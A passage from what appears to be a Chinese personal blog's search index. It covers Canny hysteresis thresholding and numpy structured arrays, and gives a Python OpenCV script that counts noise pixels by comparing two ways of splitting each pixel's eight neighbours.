id="磁滞阈值"><a href="#磁滞阈值" class="headerlink" title="磁滞阈值"></a>磁滞阈值</h5><p>确定哪些边缘全部是真正的边缘，哪些不是。为此，我们需要两个阈值 <code>minVal</code> 和 <code>maxVal</code>。强度梯度大于 <code>maxVal</code> 的任何边缘必定是边缘，而小于 <code>minVal</code> 的那些边缘必定是非边缘，因此将其丢弃。介于这两个阈值之间的对象根据其连通性被分类为边缘或非边缘。如果将它们连接到“边缘”像素，则将它们视为边缘的一部分。否则，它们也将被丢弃。</p><p><em>阈值说白了，就是人为搞个界限，挑选出较明显的边缘和非边缘，用于简化计算</em></p><p>另外，还有些特殊情况：边缘A在 <code>maxVal</code> 之上，因此被视为“确定边缘”。尽管边C低于 <code>maxVal</code> ，但它连接到边A，因此也被视为有效边，我们得到了完整的曲线。但是边缘B尽管在 <code>minVal</code> 之上并且与边缘C处于同一区域，但是它没有连接到任何“确保边缘”，因此被丢弃。因此，非常重要的一点是我们必须相应地选择 <code>minVal</code> 和 <code>maxVal</code> 以获得正确的结果。</p><p><em>在边缘为长线的假设下，该阶段还消除了小像素噪声。因此，我们最终得到的是图像中的强边缘。</em></p><h3 id="小总结"><a href="#小总结" class="headerlink" title="小总结"></a>小总结</h3><p>进阶部分就暂时学到这里（内容还有很多啊，但为了开始尝试一下自己的不一样的图像算法，还是先停下），不得不恭维一下opencv库，网上都说这是一个强大的库，但仅仅一个形容词“强大”，怎么能让我了解它，难不成仅仅是通过它的体积大，下载慢？</p><p>看过一些函数之后，才开始发自内心赞叹，比如单单拿出一个函数，让我封装起来，提供大部分语言的接口，供给通用场景使用，这就不是现在的我能做到的了，或许有一天我也可以吧。抽空得多看看这些函数的漂亮的源码。同时在接下来的任务中，我也期待着opencv能给我带来的新的震撼，或许会是仰止弥高，钻之弥坚。</p><h2 id="numpy的应用"><a href="#numpy的应用" class="headerlink" title="numpy的应用"></a>numpy的应用</h2><p>在<code>OpenCV-Python Tutorials</code>中也常提到numpy库，即便在根本没用到它的代码示例中，也会来一行<code>import numpy</code></p><p>在实践中也发现，numpy能极大提高代码编写的效率；而查阅资料后发现，numpy对数据的索引效率远高于不使用它的情况，所以numpy也是图像处理中的一大利器。</p><p>但是由于时间原因，暂时不像学习opencv一样对numpy进行系统的学习，这里就记录一些用法</p><h3 id="结构体数组"><a href="#结构体数组" class="headerlink" title="结构体数组"></a>结构体数组</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="comment"># 建立结构体类型</span></span><br><span class="line">Mytype = np.dtype(&#123;</span><br><span class="line">    <span class="string">&#x27;names&#x27;</span>: [<span class="string">&#x27;value&#x27;</span>, <span class="string">&#x27;noise&#x27;</span>, <span class="string">&#x27;part&#x27;</span>],    <span class="comment"># value像素值，noise噪声值，part分区（1/2）</span></span><br><span class="line">    <span class="string">&#x27;formats&#x27;</span>: [<span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;i&#x27;</span>]    <span class="comment"># 这里都采用整型（numpy对于变量的范围和类型要求严格）</span></span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment"># 新建结构体数组，下面的代码能直接新建自定义类型的，初始化的数组</span></span><br><span class="line">array = np.zeros((m, n), dtype=Mytype)    <span class="comment"># “(m, n)”定义数组的形式，这里为二维数组，m行n列</span></span><br></pre></td></tr></table></figure><h3 id="numpy数组排序"><a href="#numpy数组排序" class="headerlink" title="numpy数组排序"></a>numpy数组排序</h3><p>由于numpy建立的数组可以很复杂，所以numpy的排序函数的参数也很多</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy</span><br><span class="line">numpy.sort(a, axis=-<span class="number">1</span>, kind=<span class="literal">None</span>, order=<span class="literal">None</span>)</span><br><span class="line"><span class="comment"># a : 要排序的数组</span></span><br><span class="line"><span class="comment"># axis ： 按什么轴进行排序，默认按最后一个轴进行排序</span></span><br><span class="line"><span class="comment"># kind ：排序方法，默认是快速排序</span></span><br><span class="line"><span class="comment"># order : 当数组定义了字段属性时，可以按照某个属性进行排序</span></span><br></pre></td></tr></table></figure><h2 id="图像处理实战"><a href="#图像处理实战" class="headerlink" title="图像处理实战"></a>图像处理实战</h2><h3 id="测试1"><a href="#测试1" class="headerlink" title="测试1"></a>测试1</h3><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>将素材图片（同附件）读入，然后通过两种划分方法的遍历比较，得出噪声值（次数），修改像素操作（容易实现）及其他特殊情况的优化先不考虑</p><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202110280846778.png" alt="test3"></p><h4 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h4><p>（同附件）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python解释器：anaconda3/python3.8</span></span><br><span class="line"><span class="comment"># 编译器：pycharm</span></span><br><span class="line"><span class="comment"># utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> cv2 <span class="keyword">as</span> cv</span><br><span class="line"><span class="keyword">import</span> heapq</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建管理像素噪声值及分区的结构体</span></span><br><span class="line">Pixel_type = np.dtype(&#123;</span><br><span class="line">    <span class="string">&#x27;names&#x27;</span>: [<span class="string">&#x27;value&#x27;</span>, <span class="string">&#x27;noise&#x27;</span>, <span class="string">&#x27;part&#x27;</span>],  <span class="comment"># value像素值，noise噪声值，part分区（1/2）</span></span><br><span class="line">    <span class="string">&#x27;formats&#x27;</span>: [<span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;i&#x27;</span>]</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 判断区分度</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">judge_division_degree</span>(<span class="params">array</span>):</span></span><br><span class="line">    p1 = []</span><br><span class="line">    p2 = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(array)):</span><br><span class="line">        <span class="keyword">if</span> array[i][<span class="string">&#x27;part&#x27;</span>] == <span class="number">1</span>:</span><br><span class="line">            p1.append(array[i][<span class="string">&#x27;value&#x27;</span>])</span><br><span class="line">        <span class="keyword">elif</span> array[i][<span class="string">&#x27;part&#x27;</span>] == <span class="number">0</span>:</span><br><span class="line">            p2.append(array[i][<span class="string">&#x27;value&#x27;</span>])</span><br><span class="line">    <span class="comment"># 防止列表为空</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(p1) == <span class="number">0</span> <span class="keyword">or</span> <span class="built_in">len</span>(p2) == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    expected_degree = <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">min</span>(p2) - <span class="built_in">max</span>(p1) &lt;= expected_degree:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 划分方法一（不考虑位置）</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">division_method1</span>(<span class="params">array</span>):</span></span><br><span class="line">    <span class="comment"># 使p数组为有序集(p数组为一维数组，无需考虑轴)</span></span><br><span class="line">    p = np.sort(array, order=<span class="string">&#x27;value&#x27;</span>)</span><br><span class="line">    <span class="comment"># p1为p中相邻两数之差的数组</span></span><br><span class="line">    p1 = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(p) - <span class="number">1</span>):</span><br><span class="line">        p1.append(p[i + <span class="number">1</span>][<span class="string">&#x27;value&#x27;</span>] - p[i][<span class="string">&#x27;value&#x27;</span>])</span><br><span class="line">    <span class="comment"># 找出最大差值的下标</span></span><br><span class="line">    max_index = p1.index(<span class="built_in">max</span>(p1))</span><br><span class="line">    <span class="comment"># 建立较小数下标不重复数组</span></span><br><span class="line">    small_indexs = <span class="built_in">list</span>(<span class="built_in">set</span>(heapq.nsmallest(max_index + <span class="number">1</span>, p[<span class="string">&#x27;value&#x27;</span>])))</span><br><span class="line">    <span class="comment"># 将较小数划分到区域一，标记为“1”，反之，标记仍为“0”的在区域二</span></span><br><span class="line">    <span class="keyword">for</span> m <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(small_indexs)):</span><br><span class="line">        <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(array)):</span><br><span class="line">            <span class="keyword">if</span> small_indexs[m] == array[n][<span class="string">&#x27;value&#x27;</span>]:</span><br><span class="line">                array[n][<span class="string">&#x27;part&#x27;</span>] = <span class="number">1</span></span><br><span class="line">    <span class="comment"># 返回被标记好的数组</span></span><br><span class="line">    <span class="keyword">return</span> array</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 划分方法二（考虑位置）</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">division_method2</span>(<span class="params">array</span>):</span></span><br><span class="line">    <span class="comment"># 建立数组p，存放顺时针方向像素的差值(前 - 后)</span></span><br><span class="line">    p = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(array) - <span class="number">1</span>):</span><br><span class="line">        p.append(array[i][<span class="string">&#x27;value&#x27;</span>] - array[i + <span class="number">1</span>][<span class="string">&#x27;value&#x27;</span>])</span><br><span class="line">    p.append(array[-<span class="number">1</span>][<span class="string">&#x27;value&#x27;</span>] - array[<span class="number">0</span>][<span class="string">&#x27;value&#x27;</span>])</span><br><span class="line">    min_index = p.index(<span class="built_in">min</span>(p))</span><br><span class="line">    max_index = p.index(<span class="built_in">max</span>(p))</span><br><span class="line">    <span class="comment"># 始终将较小部分的数标记为1</span></span><br><span class="line">    <span class="keyword">if</span> min_index &gt; max_index:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(max_index, min_index + <span class="number">1</span>):</span><br><span class="line">            array[i][<span class="string">&#x27;part&#x27;</span>] = <span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> min_index &lt; max_index:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(p)):</span><br><span class="line">            array[i][<span class="string">&#x27;part&#x27;</span>] = <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(min_index, max_index + <span class="number">1</span>):</span><br><span class="line">            array[i][<span class="string">&#x27;part&#x27;</span>] = <span class="number">0</span></span><br><span class="line">    <span class="comment"># 返回被标记好的数组</span></span><br><span class="line">    <span class="keyword">return</span> array</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查噪声点，传入的参数为单色图像通道</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">noise_check</span>(<span class="params">image_channel</span>):</span></span><br><span class="line">    <span class="comment"># 锁定图像边界</span></span><br><span class="line">    (x, y) = image_channel.shape</span><br><span class="line">    <span class="comment"># 建立二维通道数组</span></span><br><span class="line">    b = np.zeros((x, y), dtype=Pixel_type)</span><br><span class="line">    <span class="comment"># 先建立数组</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, x):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, y):</span><br><span class="line">            <span class="comment"># 存入像素值，并初始化噪声值和分区</span></span><br><span class="line">            b[i][j] = (image_channel[i][j], <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">    <span class="comment"># 因为接下来的操作需要提取一个个完整的九宫格</span></span><br><span class="line">    <span class="comment"># 所以遍历像素点时，图像最边缘的像素点永不成为中心像素点</span></span><br><span class="line">    <span class="comment"># 即：从1开始到最大值-1结束</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, x - <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, y - <span class="number">1</span>):</span><br><span class="line">            <span class="comment"># 建立八邻域的数组，围绕中心像素点，按顺时针标记八个像素点</span></span><br><span class="line">            eight_neighbor1 = np.zeros(<span class="number">8</span>, dtype=Pixel_type)</span><br><span class="line">            eight_neighbor1[<span class="number">0</span>] = b[i - <span class="number">1</span>][j - <span class="number">1</span>]</span><br><span class="line">            eight_neighbor1[<span class="number">1</span>] = b[i - <span class="number">1</span>][j]</span><br><span class="line">            eight_neighbor1[<span class="number">2</span>] = b[i - <span class="number">1</span>][j + <span class="number">1</span>]</span><br><span class="line">            eight_neighbor1[<span class="number">3</span>] = b[i][j + <span class="number">1</span>]</span><br><span class="line">            eight_neighbor1[<span class="number">4</span>] = b[i + <span class="number">1</span>][j + <span class="number">1</span>]</span><br><span class="line">            eight_neighbor1[<span class="number">5</span>] = b[i + <span class="number">1</span>][j]</span><br><span class="line">            eight_neighbor1[<span class="number">6</span>] = b[i + <span class="number">1</span>][j - <span class="number">1</span>]</span><br><span class="line">            eight_neighbor1[<span class="number">7</span>] = b[i][j - <span class="number">1</span>]</span><br><span class="line">            <span class="comment"># 划分方法一</span></span><br><span class="line">            eight_neighbor_division1 = division_method1(eight_neighbor1)</span><br><span class="line">            <span class="comment"># 建立八邻域的数组，围绕中心像素点，按顺时针标记八个像素点</span></span><br><span class="line">            eight_neighbor2 = np.zeros(<span class="number">8</span>, dtype=Pixel_type)</span><br><span class="line">            eight_neighbor2[<span class="number">0</span>] = b[i - <span class="number">1</span>][j - <span class="number">1</span>]</span><br><span class="line">            eight_neighbor2[<span class="number">1</span>] = b[i - <span class="number">1</span>][j]</span><br><span class="line">            eight_neighbor2[<span class="number">2</span>] = b[i - <span class="number">1</span>][j + <span class="number">1</span>]</span><br><span class="line">            eight_neighbor2[<span class="number">3</span>] = b[i][j + <span class="number">1</span>]</span><br><span class="line">            eight_neighbor2[<span class="number">4</span>] = b[i + <span class="number">1</span>][j + <span class="number">1</span>]</span><br><span class="line">            eight_neighbor2[<span class="number">5</span>] = b[i + <span class="number">1</span>][j]</span><br><span class="line">            eight_neighbor2[<span class="number">6</span>] = b[i + <span class="number">1</span>][j - <span class="number">1</span>]</span><br><span class="line">            eight_neighbor2[<span class="number">7</span>] = b[i][j - <span class="number">1</span>]</span><br><span class="line">            <span class="comment"># 划分方法二</span></span><br><span class="line">            eight_neighbor_division2 = division_method2(eight_neighbor2)</span><br><span class="line">            <span class="comment"># 判断区分度</span></span><br><span class="line">            <span class="keyword">if</span> judge_division_degree(eight_neighbor_division1) <span class="keyword">and</span> \</span><br><span class="line">                    judge_division_degree(eight_neighbor_division2):</span><br><span class="line">                <span class="comment"># 找出划分区域不一样的像素点</span></span><br><span class="line">                <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">8</span>):</span><br><span class="line">                    <span class="keyword">if</span> eight_neighbor_division1[k][<span class="string">&#x27;part&#x27;</span>] != eight_neighbor_division2[k][<span class="string">&#x27;part&#x27;</span>]:</span><br><span class="line">                        <span class="keyword">if</span> k == <span class="number">0</span>:</span><br><span class="line">                            b[i - <span class="number">1</span>][j - <span class="number">1</span>][<span class="string">&#x27;noise&#x27;</span>] += <span class="number">1</span></span><br><span class="line">                        <span class="keyword">elif</span> k == <span class="number">1</span>:</span><br><span class="line">                            b[i - <span class="number">1</span>][j][<span class="string">&#x27;noise&#x27;</span>] += <span class="number">1</span></span><br><span class="line">                        <span class="keyword">elif</span> k == <span class="number">2</span>:</span><br><span class="line">                            b[i - <span class="number">1</span>][j + <span class="number">1</span>][<span class="string">&#x27;noise&#x27;</span>] += <span class="number">1</span></span><br><span class="line">                        <span class="keyword">elif</span> k == <span class="number">3</span>:</span><br><span class="line">                            b[i][j + <span class="number">1</span>][<span class="string">&#x27;noise&#x27;</span>] += <span class="number">1</span></span><br><span class="line">                        <span class="keyword">elif</span> k == <span class="number">4</span>:</span><br><span class="line">                            b[i + <span class="number">1</span>][j + <span class="number">1</span>][<span class="string">&#x27;noise&#x27;</span>] += <span class="number">1</span></span><br><span class="line">                        <span class="keyword">elif</span> k == <span class="number">5</span>:</span><br><span class="line">                            b[i + <span class="number">1</span>][j][<span class="string">&#x27;noise&#x27;</span>] += <span class="number">1</span></span><br><span class="line">                        <span class="keyword">elif</span> k == <span class="number">6</span>:</span><br><span class="line">                            b[i + <span class="number">1</span>][j - <span class="number">1</span>][<span class="string">&#x27;noise&#x27;</span>] += <span class="number">1</span></span><br><span class="line">                        <span class="keyword">elif</span> k == <span class="number">7</span>:</span><br><span class="line">                            b[i][j - <span class="number">1</span>][<span class="string">&#x27;noise&#x27;</span>] += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> b</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 以BGR方式读入图片</span></span><br><span class="line">img = cv.imread(<span class="string">&#x27;test3.png&#x27;</span>, <span class="number">1</span>)</span><br><span class="line"><span class="comment"># 检查读入是否成功</span></span><br><span class="line"><span class="comment"># print(img.shape)</span></span><br><span class="line"><span class="comment"># 输出(302, 302, 3)，代表成功</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 拆分图像通道</span></span><br><span class="line">B, G, R = cv.split(img)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 调用 noise_check() 函数，检查可能的噪声点</span></span><br><span class="line">b_px = noise_check(B)  <span class="comment"># 以B通道举例</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 在output。txt文件下输出噪声值的矩阵排布</span></span><br><span class="line">pf = <span class="built_in">open</span>(<span class="string">&#x27;output.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i1 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">302</span>):</span><br><span class="line">    <span class="keyword">for</span> j1 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">302</span>):</span><br><span class="line">        <span class="built_in">print</span>(b_px[i1][j1][<span class="string">&#x27;noise&#x27;</span>], end=<span class="string">&#x27;&#x27;</span>, file=pf)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>, file=pf)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;导出成功&quot;</span>)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 图像处理 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> opencv </tag>
            
            <tag> 图像处理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/hello-world/"/>
      <url>/hello-world/</url>
      
        <content type="html"><![CDATA[<p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202110251233406.png" alt="p2684995706"></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
